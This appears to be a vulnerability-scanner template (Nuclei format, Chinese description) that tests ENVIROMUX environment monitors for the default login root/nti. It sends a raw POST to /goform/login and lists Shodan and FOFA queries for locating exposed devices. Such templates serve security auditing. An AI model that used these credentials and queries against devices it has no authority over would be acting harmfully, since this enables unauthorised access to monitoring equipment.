id: enviromuux-default-login

info:
  name: Network Technologies Inc ENVIROMUX 默认口令登录（弱口令）
  author: M.Sarmad Shafiq
  severity: high
  description: |
    该模板通过尝试 Network Technologies Inc ENVIROMUX 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - http://www.networktechinc.com/download/d-environment-monitor-16.html
    - http://www.networktechinc.com/pdf/man154.pdf
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"ENVIROMUX"
    fofa-query: body="ENVIROMUX"
  tags: default-login,networktechnologies,enviromux,vuln

variables:
  username: "root"
  password: "nti"

http:
  - raw:
      - |
        POST /goform/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"success":"true"'
          - '"cookie":"sessionId='
        condition: and

      - type: status
        status:
          - 200
